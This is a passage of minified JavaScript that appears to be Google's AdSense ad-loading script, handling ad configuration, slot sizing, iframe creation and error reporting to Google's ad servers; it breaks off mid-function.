(function(){var m=this,aa=function(a,b,c){return a.call.apply(a.bind,arguments)},ba=function(a,b,c){if(!a)throw Error();if(2<arguments.length){var d=Array.prototype.slice.call(arguments,2);return function(){var c=Array.prototype.slice.call(arguments);Array.prototype.unshift.apply(c,d);return a.apply(b,c)}}return function(){return a.apply(b,arguments)}},p=function(a,b,c){p=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?aa:ba;return p.apply(null,arguments)},ca=Date.now||
function(){return+new Date},da=function(a,b){function c(){}c.prototype=b.prototype;a.Ha=b.prototype;a.prototype=new c;a.prototype.constructor=a;a.Ga=function(a,c,f){for(var d=Array(arguments.length-2),e=2;e<arguments.length;e++)d[e-2]=arguments[e];return b.prototype[c].apply(a,d)}};var r=(new Date).getTime();var ea={'"':'\\"',"\\":"\\\\","/":"\\/","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t","\x0B":"\\u000b"},fa=/\uffff/.test("\uffff")?/[\\\"\x00-\x1f\x7f-\uffff]/g:/[\\\"\x00-\x1f\x7f-\xff]/g,ga=function(){},ia=function(a,b,c){switch(typeof b){case "string":ha(b,c);break;case "number":c.push(isFinite(b)&&!isNaN(b)?String(b):"null");break;case "boolean":c.push(String(b));break;case "undefined":c.push("null");break;case "object":if(null==b){c.push("null");break}if(b instanceof Array||void 0!=
b.length&&b.splice){var d=b.length;c.push("[");for(var e="",f=0;f<d;f++)c.push(e),ia(a,b[f],c),e=",";c.push("]");break}c.push("{");d="";for(e in b)b.hasOwnProperty(e)&&(f=b[e],"function"!=typeof f&&(c.push(d),ha(e,c),c.push(":"),ia(a,f,c),d=","));c.push("}");break;case "function":break;default:throw Error("Unknown type: "+typeof b);}},ha=function(a,b){b.push('"');b.push(a.replace(fa,function(a){if(a in ea)return ea[a];var b=a.charCodeAt(0),c="\\u";16>b?c+="000":256>b?c+="00":4096>b&&(c+="0");return ea[a]=
c+b.toString(16)}));b.push('"')};var t=String.prototype.trim?function(a){return a.trim()}:function(a){return a.replace(/^[\s\xa0]+|[\s\xa0]+$/g,"")},qa=function(a){if(!ja.test(a))return a;-1!=a.indexOf("&")&&(a=a.replace(ka,"&amp;"));-1!=a.indexOf("<")&&(a=a.replace(la,"&lt;"));-1!=a.indexOf(">")&&(a=a.replace(ma,"&gt;"));-1!=a.indexOf('"')&&(a=a.replace(na,"&quot;"));-1!=a.indexOf("'")&&(a=a.replace(oa,"&#39;"));-1!=a.indexOf("\x00")&&(a=a.replace(pa,"&#0;"));return a},ka=/&/g,la=/</g,ma=/>/g,na=/"/g,oa=/'/g,pa=/\x00/g,ja=/[\x00&<>"']/,
ra={"\x00":"\\0","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t","\x0B":"\\x0B",'"':'\\"',"\\":"\\\\","<":"<"},u={"'":"\\'"},sa=function(a,b){return a<b?-1:a>b?1:0};var ta=Array.prototype.forEach?function(a,b,c){Array.prototype.forEach.call(a,b,c)}:function(a,b,c){for(var d=a.length,e="string"==typeof a?a.split(""):a,f=0;f<d;f++)f in e&&b.call(c,e[f],f,a)},ua=function(a){return Array.prototype.concat.apply(Array.prototype,arguments)};var va=function(a,b,c){this.label=a;this.type=4;this.eventId=b;this.value=c};var xa=function(a){this.l=wa();this.s=Math.random()<a;this.events=[];this.j={}},wa=m.performance&&m.performance.now?p(m.performance.now,m.performance):ca;xa.prototype.install=function(a){a=a||window;a.google_js_reporting_queue=a.google_js_reporting_queue||[];this.events=a.google_js_reporting_queue};
var ya=function(a,b,c){var d=wa();c=c();d=wa()-a.l-(d-a.l);if(a.s){var e=a.j[b]||0,f=e+1;f>e&&(a.j[b]=f);a.events.push(new va(b,f,d))}return c},Aa=function(a,b){return p(function(){for(var c=[],d=0;d<arguments.length;++d)c[d]=arguments[d];return ya(this,a,function(){return b.apply(void 0,c)})},za)};var w=function(a){w[" "](a);return a};w[" "]=function(){};var Ca=function(a,b){var c=Ba;Object.prototype.hasOwnProperty.call(c,a)||(c[a]=b(a))};var z=function(a){try{var b;if(b=!!a&&null!=a.location.href)a:{try{w(a.foo);b=!0;break a}catch(c){}b=!1}return b}catch(c){return!1}},Da=function(a,b){return b.getComputedStyle?b.getComputedStyle(a,null):a.currentStyle},Ea=function(a,b){for(var c in a)Object.prototype.hasOwnProperty.call(a,c)&&b.call(void 0,a[c],c,a)},Fa=function(a){var b=a.length;if(0==b)return 0;for(var c=305419896,d=0;d<b;d++)c^=(c<<5)+(c>>2)+a.charCodeAt(d)&4294967295;return 0<c?c:4294967296+c},Ga=/^([0-9.]+)px$/,Ha=function(a){return(a=
Ga.exec(a))?+a[1]:null};var Ia=function(a,b){this.j=a;this.l=b},Ja=function(a,b,c){this.url=a;this.j=b;this.M=!!c;this.depth=null};var Ka=function(){var a=!1;try{var b=Object.defineProperty({},"passive",{get:function(){a=!0}});window.addEventListener("test",null,b)}catch(c){}return a}(),La=function(a,b){a.addEventListener?a.addEventListener("load",b,Ka?void 0:!1):a.attachEvent&&a.attachEvent("onload",b)};var Ma=function(a,b,c,d,e){this.w=c||4E3;this.s=a||"&";this.D=b||",$";this.u=void 0!==d?d:"trn";this.G=e||null;this.v=!1;this.l={};this.F=0;this.j=[]},Na=function(a,b){var c={};c[a]=b;return[c]},C=function(a,b,c,d){a.j.push(b);a.l[b]=Na(c,d)},Qa=function(a,b,c,d){b=b+"//"+c+d;var e=Oa(a)-d.length-0;if(0>e)return"";a.j.sort(function(a,b){return a-b});d=null;c="";for(var f=0;f<a.j.length;f++)for(var g=a.j[f],h=a.l[g],k=0;k<h.length;k++){if(!e){d=null==d?g:d;break}var l=Pa(h[k],a.s,a.D);if(l){l=c+l;
if(e>=l.length){e-=l.length;b+=l;c=a.s;break}else a.v&&(c=e,l[c-1]==a.s&&--c,b+=l.substr(0,c),c=a.s,e=0);d=null==d?g:d}}f="";a.u&&null!=d&&(f=c+a.u+"="+(a.G||d));return b+f+""},Oa=function(a){if(!a.u)return a.w;var b=1,c;for(c in a.l)b=c.length>b?c.length:b;return a.w-a.u.length-b-a.s.length-1},Pa=function(a,b,c,d,e){var f=[];Ea(a,function(a,h){(a=Ra(a,b,c,d,e))&&f.push(h+"="+a)});return f.join(b)},Ra=function(a,b,c,d,e){if(null==a)return"";b=b||"&";c=c||",$";"string"==typeof c&&(c=c.split(""));if(a instanceof
Array){if(d=d||0,d<c.length){for(var f=[],g=0;g<a.length;g++)f.push(Ra(a[g],b,c,d+1,e));return f.join(c[d])}}else if("object"==typeof a)return e=e||0,2>e?encodeURIComponent(Pa(a,b,c,d,e+1)):"...";return encodeURIComponent(String(a))};var Ta=function(a,b,c,d){if(Math.random()<(d||a.j))try{var e;c instanceof Ma?e=c:(e=new Ma,Ea(c,function(a,b){var c=e,d=c.F++;a=Na(b,a);c.j.push(d);c.l[d]=a}));var f=Qa(e,a.u,a.l,a.s+b+"&");f&&Sa(f)}catch(g){}},Sa=function(a){m.google_image_requests||(m.google_image_requests=[]);var b=m.document.createElement("img");b.src=a;m.google_image_requests.push(b)};var Ua=function(a,b,c){this.u=a;this.w=b;this.s=c;this.l=null;this.v=this.j},Va=function(a,b,c){this.s=a;this.j=b||"";this.l=c||-1},Xa=function(a,b,c,d){var e;try{e=c()}catch(h){var f=a.s;try{var g=Wa(h),f=(d||a.v).call(a,b,g,void 0,void 0)}catch(k){a.j("pAR",k)}if(!f)throw h;}finally{}return e},Ya=function(a,b,c,d){return function(){for(var e=[],f=0;f<arguments.length;++f)e[f]=arguments[f];return Xa(a,b,function(){return c.apply(void 0,e)},d)}};
Ua.prototype.j=function(a,b,c,d,e){try{var f=e||this.w,g=new Ma;g.v=!0;C(g,1,"context",a);b instanceof Va||(b=Wa(b));C(g,2,"msg",b.s.substring(0,512));b.j&&C(g,3,"file",b.j);0<b.l&&C(g,4,"line",b.l.toString());b={};if(this.l)try{this.l(b)}catch(y){}if(d)try{d(b)}catch(y){}d=[b];g.j.push(5);g.l[5]=d;var h;e=m;d=[];var k,l=null;do{b=e;z(b)?(k=b.location.href,l=b.document&&b.document.referrer||null):(k=l,l=null);d.push(new Ja(k||"",b));try{e=b.parent}catch(y){e=null}}while(e&&b!=e);k=0;for(var q=d.length-
1;k<=q;++k)d[k].depth=q-k;b=m;if(b.location&&b.location.ancestorOrigins&&b.location.ancestorOrigins.length==d.length-1)for(k=1;k<d.length;++k){var n=d[k];n.url||(n.url=b.location.ancestorOrigins[k-1]||"",n.M=!0)}for(var v=new Ja(m.location.href,m,!1),A=d.length-1,q=A;0<=q;--q){var x=d[q];if(x.url&&!x.M){v=x;break}}var x=null,B=d.length&&d[A].url;0!=v.depth&&B&&(x=d[A]);h=new Ia(v,x);h.l&&C(g,6,"top",h.l.url||"");C(g,7,"url",h.j.url||"");Ta(this.u,f,g,c)}catch(y){try{Ta(this.u,f,{context:"ecmserr",
rctx:a,msg:Za(y),url:h.j.url},c)}catch(fc){}}return this.s};var Wa=function(a){return new Va(Za(a),a.fileName,a.lineNumber)},Za=function(a){var b=a.toString();a.name&&-1==b.indexOf(a.name)&&(b+=": "+a.name);a.message&&-1==b.indexOf(a.message)&&(b+=": "+a.message);if(a.stack){a=a.stack;var c=b;try{-1==a.indexOf(c)&&(a=c+"\n"+a);for(var d;a!=d;)d=a,a=a.replace(/((https?:\/..*\/)[^\/:]*:\d+(?:.|\n)*)\2/,"$1");b=a.replace(/\n */g,"\n")}catch(e){b=c}}return b};var $a="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" "),ab=function(a,b){for(var c,d,e=1;e<arguments.length;e++){d=arguments[e];for(c in d)a[c]=d[c];for(var f=0;f<$a.length;f++)c=$a[f],Object.prototype.hasOwnProperty.call(d,c)&&(a[c]=d[c])}};var D;a:{var bb=m.navigator;if(bb){var cb=bb.userAgent;if(cb){D=cb;break a}}D=""}var E=function(a){return-1!=D.indexOf(a)};var db=E("Opera"),F=E("Trident")||E("MSIE"),eb=E("Edge"),G=E("Gecko")&&!(-1!=D.toLowerCase().indexOf("webkit")&&!E("Edge"))&&!(E("Trident")||E("MSIE"))&&!E("Edge"),fb=-1!=D.toLowerCase().indexOf("webkit")&&!E("Edge"),gb=function(){var a=m.document;return a?a.documentMode:void 0},hb;
a:{var ib="",jb=function(){var a=D;if(G)return/rv\:([^\);]+)(\)|;)/.exec(a);if(eb)return/Edge\/([\d\.]+)/.exec(a);if(F)return/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a);if(fb)return/WebKit\/(\S+)/.exec(a);if(db)return/(?:Version)[ \/]?(\S+)/.exec(a)}();jb&&(ib=jb?jb[1]:"");if(F){var kb=gb();if(null!=kb&&kb>parseFloat(ib)){hb=String(kb);break a}}hb=ib}
var lb=hb,Ba={},mb=function(a){Ca(a,function(){for(var b=0,c=t(String(lb)).split("."),d=t(String(a)).split("."),e=Math.max(c.length,d.length),f=0;0==b&&f<e;f++){var g=c[f]||"",h=d[f]||"";do{g=/(\d*)(\D*)(.*)/.exec(g)||["","","",""];h=/(\d*)(\D*)(.*)/.exec(h)||["","","",""];if(0==g[0].length&&0==h[0].length)break;b=sa(0==g[1].length?0:parseInt(g[1],10),0==h[1].length?0:parseInt(h[1],10))||sa(0==g[2].length,0==h[2].length)||sa(g[2],h[2]);g=g[3];h=h[3]}while(0==b)}return 0<=b})},nb;var ob=m.document;
nb=ob&&F?gb()||("CSS1Compat"==ob.compatMode?parseInt(lb,10):5):void 0;var pb=E("Safari")&&!((E("Chrome")||E("CriOS"))&&!E("Edge")||E("Coast")||E("Opera")||E("Edge")||E("Silk")||E("Android"))&&!(E("iPhone")&&!E("iPod")&&!E("iPad")||E("iPad")||E("iPod"));var H=null,qb=null,rb=G||fb&&!pb||db||"function"==typeof m.btoa,sb=function(a,b){var c;if(rb&&!b)c=m.btoa(a);else{c=[];for(var d=0,e=0;e<a.length;e++){for(var f=a.charCodeAt(e);255<f;)c[d++]=f&255,f>>=8;c[d++]=f}if(!H)for(H={},qb={},a=0;65>a;a++)H[a]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(a),qb[a]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.".charAt(a);b=b?qb:H;a=[];for(d=0;d<c.length;d+=3){var g=c[d],h=(e=d+1<c.length)?c[d+1]:0,k=(f=d+2<c.length)?
c[d+2]:0,l=g>>2,g=(g&3)<<4|h>>4,h=(h&15)<<2|k>>6,k=k&63;f||(k=64,e||(h=64));a.push(b[l],b[g],b[h],b[k])}c=a.join("")}return c};var I=function(a){a=parseFloat(a);return isNaN(a)||1<a||0>a?0:a},tb=/^([\w-]+\.)*([\w-]{2,})(\:[0-9]+)?$/,ub=function(a,b){return a?(a=a.match(tb))?a[0]:b:b};var vb=I("0.0"),wb=I("0.10"),xb=I("0.05"),yb=I("0.05"),zb=I("0.02"),Ab=I("0.1"),Bb=I("0.02"),Cb=I("0.001"),Db=I("0.01");var Eb=function(){return"r20161205"},J=/^true$/.test("false")?!0:!1,Fb=/^true$/.test("true")?!0:!1,Gb=/^true$/.test("false")?!0:!1,Hb=Gb||!Fb;var Ib;if(!(Ib=!G&&!F)){var Jb;if(Jb=F)Jb=9<=Number(nb);Ib=Jb}Ib||G&&mb("1.9.1");F&&mb("9");var K=document,L=window,Kb=null,M=K.getElementsByTagName("script");M&&M.length&&(Kb=M[M.length-1]);var Lb=Kb;var Mb=Object.prototype.hasOwnProperty,Nb=function(a,b){for(var c in a)Mb.call(a,c)&&b.call(void 0,a[c],c,a)},N=function(a){return!(!a||!a.call)&&"function"===typeof a},Ob=function(a,b){for(var c=1,d=arguments.length;c<d;++c)a.push(arguments[c])},O=function(a,b){if(a.indexOf)return a=a.indexOf(b),0<a||0===a;for(var c=0;c<a.length;c++)if(a[c]===b)return!0;return!1},Pb=function(a){"google_onload_fired"in a||(a.google_onload_fired=!1,La(a,function(){a.google_onload_fired=!0}))},Qb=function(a){a=a.google_unique_id;
return"number"===typeof a?a:0},Rb=!!window.google_async_iframe_id,P=Rb&&window.parent||window;var Q,za=new xa(1);Q=new Ua(new function(){this.u="http:"===L.location.protocol?"http:":"https:";this.l="pagead2.googlesyndication.com";this.s="/pagead/gen_204?id=";this.j=.01},"jserror",!0);za.install(function(){if(Rb&&!z(P)){var a="."+K.domain;try{for(;2<a.split(".").length&&!z(P);)K.domain=a=a.substr(a.indexOf(".")+1),P=window.parent}catch(b){}z(P)||(P=window)}return P}());
var Ub=function(a,b){Sb(a,b,Tb)()},Sb=function(a,b,c){a=a.toString();return Ya(Q,a,Aa(a,b),c)},Tb=Q.j,Vb=function(a,b){return Sb(a.toString(),b)};var Wb="google_ad_block google_ad_channel google_ad_client google_ad_format google_ad_height google_ad_host google_ad_host_channel google_ad_host_tier_id google_ad_modifications google_ad_output google_ad_region google_ad_section google_ad_slot google_ad_type google_ad_unit_key google_ad_dom_fingerprint google_ad_width google_adtest google_allow_expandable_ads google_alternate_ad_url google_alternate_color google_ama google_analytics_domain_name google_analytics_uacct google_analytics_url_parameters google_auto_format google_available_width google_captcha_token google_city google_color_bg google_color_border google_color_line google_color_link google_color_text google_color_url google_container_id google_content_recommendation_ui_type google_content_recommendation_columns_num google_content_recommendation_rows_num google_contents google_core_dbp google_country google_cpm google_ctr_threshold google_cust_age google_cust_ch google_cust_criteria google_cust_gender google_cust_id google_cust_interests google_cust_job google_cust_l google_cust_lh google_cust_u_url google_disable_video_autoplay google_delay_requests_count google_delay_requests_delay google_ed google_eids google_enable_content_recommendations google_enable_ose google_encoding google_floating_ad_position google_font_face google_font_size google_frame_id google_gl google_hints google_is_split_slot google_image_size google_kw google_kw_type google_lact google_language google_loeid google_max_num_ads google_max_radlink_len google_mtl google_native_settings_key google_nofo google_num_radlinks google_num_radlinks_per_unit google_only_ads_with_video google_only_pyv_ads google_only_userchoice_ads google_override_format google_page_url google_pgb_reactive google_previous_watch google_previous_searches google_pucrd google_referrer_url google_region google_responsive_formats google_responsive_auto_format google_reuse_colors google_rl_dest_url google_rl_filtering google_rl_mode google_rt google_safe google_safe_for_responsive_override google_scs google_source_type google_sui google_skip google_tag_for_child_directed_treatment google_tag_info google_tag_origin google_targeting google_tdsma google_tfs google_tl google_ui_features google_video_doc_id google_video_product_type google_video_url_to_fetch google_webgl_support google_with_pyv_ads google_yt_pt google_yt_up".split(" "),
Xb={google_ad_modifications:!0,google_analytics_domain_name:!0,google_analytics_uacct:!0},Yb=function(a){return(a=a.innerText||a.innerHTML)&&(a=a.replace(/^\s+/,"").split(/\r?\n/,1)[0].match(/^\x3c!--+(.*?)(?:--+>)?\s*$/))&&/google_ad_client/.test(a[1])?a[1]:null},Zb=function(a){if(a=a.innerText||a.innerHTML)if(a=a.replace(/^\s+|\s+$/g,"").replace(/\s*(\r?\n)+\s*/g,";"),(a=a.match(/^\x3c!--+(.*?)(?:--+>)?$/)||a.match(/^\/*\s*<!\[CDATA\[(.*?)(?:\/*\s*\]\]>)?$/i))&&/google_ad_client/.test(a[1]))return a[1];
return null},bc=function(a){var b;try{a:{var c=a.document.getElementsByTagName("script"),d=a.navigator&&a.navigator.userAgent||"",e;if(!(e=/appbankapppuzdradb|daumapps|fban|fbios|fbav|fb_iab|gsa\/|messengerforios|naver|niftyappmobile|nonavigation|pinterest|twitter|ucbrowser|yjnewsapp|youtube/i.test(d))){var f;if(f=/i(phone|pad|pod)/i.test(d)){var g;if(g=/applewebkit/i.test(d)&&!/version|safari/i.test(d)){var h;try{h=!(!L.navigator.X&&!(J&&L.google_top_window||L.top).navigator.X)}catch(v){h=!1}g=!h}f=
g}e=f}for(var d=e?Yb:Zb,k=c.length-1;0<=k;k--){var l=c[k];if(!l.google_parsed_script){l.google_parsed_script=!0;var q=d(l);if(q){b=q;break a}}}b=null}}catch(v){return!1}if(!b)return!1;try{for(var c=/(google_\w+) *= *(['"]?[\w.-]+['"]?) *(?:;|$)/gm,k={},n;n=c.exec(b);)k[n[1]]=$b(n[2]);ac(k,a)}catch(v){return!1}return!!a.google_ad_client},cc=function(a){a.google_page_url&&(a.google_page_url=String(a.google_page_url));var b=[];Nb(a,function(a,d){if(null!=a){var c;try{var f=[];ia(new ga,a,f);c=f.join("")}catch(g){}c&&
(c=c.replace(/\//g,"\\$&"),Ob(b,d,"=",c,";"))}});return b.join("")},dc=function(a){for(var b=0,c=Wb.length;b<c;b++){var d=Wb[b];Xb[d]||(a[d]=null)}},$b=function(a){switch(a){case "true":return!0;case "false":return!1;case "null":return null;case "undefined":break;default:try{var b=a.match(/^(?:'(.*)'|"(.*)")$/);if(b)return b[1]||b[2]||"";if(/^[-+]?\d*(\.\d+)?$/.test(a)){var c=parseFloat(a);return c===c?c:void 0}}catch(d){}}},ac=function(a,b){for(var c=0;c<Wb.length;c++){var d=Wb[c];null==b[d]&&null!=
a[d]&&(b[d]=a[d])}};var ec=function(a){return(a=a.google_ad_modifications)?a.eids||[]:[]},R=function(a){return(a=a.google_ad_modifications)?a.loeids||[]:[]},gc=function(a,b,c){if(!a)return null;for(var d=0;d<a.length;++d)if((a[d].ad_slot||b)==b&&(a[d].ad_tag_origin||c)==c)return a[d];return null};var hc={client:"google_ad_client",format:"google_ad_format",slotname:"google_ad_slot",output:"google_ad_output",ad_type:"google_ad_type",pse:"google_pstate_expt"};Q.s=!J;var ic=!1;var jc=null,kc=function(){if(!jc){for(var a=window,b=a,c=0;a&&a!=a.parent;)if(a=a.parent,c++,z(a))b=a;else break;jc=b}return jc};var S={m:"388900710",B:"388900711",A:"388900712",C:"388900713"},lc={m:"10583695",o:"10583696"},mc={m:"10573695",o:"10573696"},nc={m:"4089030",o:"4089031"},oc={m:"4089035",o:"4089036"},T={ca:{},Ea:{m:"453848102",o:"453848103"},Da:{m:"137237720",o:"137237721"},na:{m:"24819308",o:"24819309",$:"24819320",ea:"24819321"},ma:{m:"24819330",o:"24819331"},ja:{m:"86724438",o:"86724439"},T:{m:"388900700",B:"388900701",A:"388900702",C:"388900703"},da:{m:"26835105",o:"26835106"},U:{m:"20040000",o:"20040001"},aa:{m:"20040016",
o:"20040017"},ba:{Y:"314159230",la:"314159231"},ka:{sa:"27285692",ua:"27285712",ta:"27285713"},pa:{m:"27415010",o:"27415011"},ha:{m:"90091300",o:"90091301",ga:"90091302",fa:"90091303"},I:{m:"62710000",o:"62710001"},J:{m:"62710002",o:"62710003"},qa:{m:"20040060",oa:"20040061",ia:"20040062"},ra:{Ba:389613E3,Ca:389613001,za:389613002,Aa:389613003,xa:389613004,ya:389613005,va:389613006,wa:389613007},Z:{m:"20040063",o:"20040064"},K:{m:"62710010",VIEWPORT:"62710011",H:"62710012"},Fa:{m:"20040065",o:"20040066"}},
ic=!1;var U=function(a,b){b&&a.push(b)},V=function(a,b,c){for(var d=0;d<c.length;d++)if(a.location&&a.location.hash=="#google_plle_"+c[d])return c[d];var e;a:{try{var f=window.top.location.hash;if(f){var g=f.match(/\bdeid=([\d,]+)/);e=g&&g[1]||"";break a}}catch(k){}e=""}if(a=(a=e.match(new RegExp("\\b("+c.join("|")+")\\b")))&&a[0]||null)c=a;else if(ic)c=null;else a:{if(!(1E-4>Math.random())&&(a=Math.random(),a<b)){b=window;try{var h=new Uint32Array(1);b.crypto.getRandomValues(h);a=h[0]/65536/65536}catch(k){a=
Math.random()}c=c[Math.floor(a*c.length)];break a}c=null}return c};var pc=function(a,b,c){Ub("files::getSrc",function(){if("https:"==L.location.protocol&&"http"==c)throw c="https",Error("Requested url "+a+b);});return[c,"://",a,b].join("")},qc=function(a,b,c){c||(c=Hb?"https":"http");return pc(a,b,c)};var rc=function(a){a=a.document;return("CSS1Compat"==a.compatMode?a.documentElement:a.body)||{}};var sc=function(a){this.name="TagError";this.message=a?"adsbygoogle.push() error: "+a:"";Error.captureStackTrace?Error.captureStackTrace(this,sc):this.stack=Error().stack||""};da(sc,Error);var tc=function(a,b){this.l=a;this.j=b};tc.prototype.minWidth=function(){return this.l};tc.prototype.height=function(){return this.j};var W=function(a,b,c){tc.call(this,a,b);this.V=c};da(W,tc);var uc=function(a){return function(b){return!!(b.V&a)}},X=[new W(970,90,2),new W(728,90,2),new W(468,60,2),new W(336,280,1),new W(320,100,2),new W(320,50,2),new W(300,600,4),new W(300,250,1),new W(250,250,1),new W(234,60,2),new W(200,200,1),new W(180,150,1),new W(160,600,4),new W(125,125,1),new W(120,600,4),new W(120,240,4)],vc=[X[6],X[12],X[3],X[0],X[7],X[14],X[1],X[8],X[10],X[4],X[15],X[2],X[11],X[5],X[13],X[9]];var wc=function(a,b){do{var c=Da(a,b);if(c&&"fixed"==c.position)return!1}while(a=a.parentElement);return!0};var xc=function(a,b,c){if(a.style){var d=Ha(a.style[c]);if(d)return d}if(a=Da(a,b))if(d=Ha(a[c]))return d;return null},yc=function(a){return function(b){return b.minWidth()<=a}},Ac=function(a,b,c){var d=a&&zc(c,b);return function(a){return!(d&&250<=a.height())}},zc=function(a,b){var c;try{var d=b.document.documentElement.getBoundingClientRect(),e=a.getBoundingClientRect();c={x:e.left-d.left,y:e.top-d.top}}catch(f){c=null}return(c?c.y:0)<rc(b).clientHeight-100},Bc=function(a,b){var c=Infinity;do{var d=
xc(b,a,"height");d&&(c=Math.min(c,d));(d=xc(b,a,"maxHeight"))&&(c=Math.min(c,d))}while((b=b.parentElement)&&"HTML"!=b.tagName);return c};var Cc=function(a){return function(b){for(var c=a.length-1;0<=c;--c)if(!a[c](b))return!1;return!0}},Dc=function(a,b,c){for(var d=a.length,e=null,f=0;f<d;++f){var g=a[f];if(b(g)){if(!c||c(g))return g;null===e&&(e=g)}}return e};var Ec=function(a){this.j=a};var Gc=function(a,b,c){var d,e=.25>=a/Math.min(1200,rc(b).clientWidth)?4:3;d=d||{};d.google_responsive_formats=e;d=!(E("iPad")||E("Android")&&!E("Mobile")||E("Silk"))&&(E("iPod")||E("iPhone")||E("Android")||E("IEMobile"))&&!zc(c,b)&&(d.google_safe_for_responsive_override=wc(c,b));var f=(d?vc:X).slice(0);(300>a||450<a?0:O(ec(b),S.B)||O(ec(b),S.A))&&f.unshift(new W(a,Math.floor(.8334*a+20),1));var g=488>rc(b).clientWidth,e=[yc(a),Fc(g),Ac(g,b,c),uc(e)],g=[];if(d){var h=Bc(b,c);g.push(function(a){return a.height()<=
h})}b=Dc(f,Cc(e),Cc(g));if(!b)throw new sc("No slot size for availableWidth="+a);return new Ec(b)},Fc=function(a){return function(b){return!(320==b.minWidth()&&(a&&50==b.height()||!a&&100==b.height()))}};var Hc=function(a){this.j=a;a.google_iframe_oncopy||(a.google_iframe_oncopy={handlers:{},upd:p(this.u,this)});this.s=a.google_iframe_oncopy},Ic=function(a,b){var c=new RegExp("\\b"+a+"=(\\d+)"),d=c.exec(b);d&&(b=b.replace(c,a+"="+(+d[1]+1||1)));return b};Hc.prototype.set=function(a,b){this.s.handlers[a]=b;this.j.addEventListener&&this.j.addEventListener("load",p(this.l,this,a),!1)};
Hc.prototype.l=function(a){a=this.j.document.getElementById(a);try{var b=a.contentWindow.document;if(a.onload&&b&&(!b.body||!b.body.firstChild))a.onload()}catch(c){}};Hc.prototype.u=function(a,b){var c=Ic("rx",a);a:{if(a&&(a=a.match("dt=([^&]+)"))&&2==a.length){a=a[1];break a}a=""}a=(new Date).getTime()-a;c=c.replace(/&dtd=(\d+|-?M)/,"&dtd="+(1E5<=a?"M":0<=a?a:"-M"));this.set(b,c);return c};var Jc=qa("var i=this.id,s=window.google_iframe_oncopy,H=s&&s.handlers,h=H&&H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&&d&&(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}");var Kc=function(a){if(!a)return"";(a=a.toLowerCase())&&"ca-"!=a.substring(0,3)&&(a="ca-"+a);return a};G||fb||F&&mb(11);var Lc=/MSIE [2-7]|PlayStation|Gecko\/20090226|Android 2\.|Opera/i;var Mc=null;var Nc={"120x90":!0,"160x90":!0,"180x90":!0,"200x90":!0,"468x15":!0,"728x15":!0};var Y=function(a){this.u=[];this.l=a||window;this.j=0;this.s=null;this.F=0},Z,Oc=function(a){try{return a.sz()}catch(b){return!1}},Pc=function(a){return!!a&&("object"===typeof a||"function"===typeof a)&&Oc(a)&&N(a.nq)&&N(a.nqa)&&N(a.al)&&N(a.rl)},Qc=function(){if(Z&&Oc(Z))return Z;var a=kc(),b=a.google_jobrunner;return Pc(b)?Z=b:a.google_jobrunner=Z=new Y(a)},Rc=function(a,b){Qc().nq(a,b)},Sc=function(a,b){Qc().nqa(a,b)};
Y.prototype.G=function(a,b){0!=this.j||0!=this.u.length||b&&b!=window?this.v(a,b):(this.j=2,this.D(new Tc(a,window)))};Y.prototype.v=function(a,b){this.u.push(new Tc(a,b||this.l));Uc(this)};Y.prototype.O=function(a){this.j=1;if(a){var b=Vb("sjr::timeout",p(this.w,this,!0));this.s=this.l.setTimeout(b,a)}};Y.prototype.w=function(a){a&&++this.F;1==this.j&&(null!=this.s&&(this.l.clearTimeout(this.s),this.s=null),this.j=0);Uc(this)};Y.prototype.P=function(){return!(!window||!Array)};Y.prototype.N=function(){return this.F};
var Uc=function(a){var b=Vb("sjr::tryrun",p(a.R,a));a.l.setTimeout(b,0)};Y.prototype.R=function(){if(0==this.j&&this.u.length){var a=this.u.shift();this.j=2;var b=Vb("sjr::run",p(this.D,this,a));a.j.setTimeout(b,0);Uc(this)}};Y.prototype.D=function(a){this.j=0;a.l()};Y.prototype.nq=Y.prototype.G;Y.prototype.nqa=Y.prototype.v;Y.prototype.al=Y.prototype.O;Y.prototype.rl=Y.prototype.w;Y.prototype.sz=Y.prototype.P;Y.prototype.tc=Y.prototype.N;var Tc=function(a,b){this.l=a;this.j=b};var Vc=Rb?1==Qb(L):!Qb(L),Wc=function(){var a=Gb?"https":"http",b=w("script"),c;a:{if(J)try{var d=L.google_cafe_host||L.top.google_cafe_host;if(d){c=d;break a}}catch(e){}c=ub("","pagead2.googlesyndication.com")}return["<",b,' src="',qc(c,["/pagead/js/",Eb(),"/r20161129/show_ads_impl.js"].join(""),a),'"></',b,">"].join("")},Xc=function(a,b,
c,d){return function(){var e=!1;d&&Qc().al(3E4);try{var f=a.document.getElementById(b).contentWindow;if(z(f)){var g=a.document.getElementById(b).contentWindow,h=g.document;h.body&&h.body.firstChild||(/Firefox/.test(navigator.userAgent)?h.open("text/html","replace"):h.open(),g.google_async_iframe_close=!0,h.write(c))}else{for(var k=a.document.getElementById(b).contentWindow,f=c,f=String(f),g=['"'],h=0;h<f.length;h++){var l=f.charAt(h),q=l.charCodeAt(0),n=h+1,v;if(!(v=ra[l])){var A;if(31<q&&127>q)A=
l;else{var x=void 0,B=l;if(B in u)A=u[B];else if(B in ra)A=u[B]=ra[B];else{var y=B.charCodeAt(0);if(31<y&&127>y)x=B;else{if(256>y){if(x="\\x",16>y||256<y)x+="0"}else x="\\u",4096>y&&(x+="0");x+=y.toString(16).toUpperCase()}A=u[B]=x}}v=A}g[n]=v}g.push('"');k.location.replace("javascript:"+g.join(""))}e=!0}catch(fc){k=kc().google_jobrunner,Pc(k)&&k.rl()}e&&(e=Ic("google_async_rrc",c),(new Hc(a)).set(b,Xc(a,b,e,!1)))}},Yc=function(a){var b=["<iframe"];Nb(a,function(a,d){null!=a&&b.push(" "+d+'="'+qa(a)+
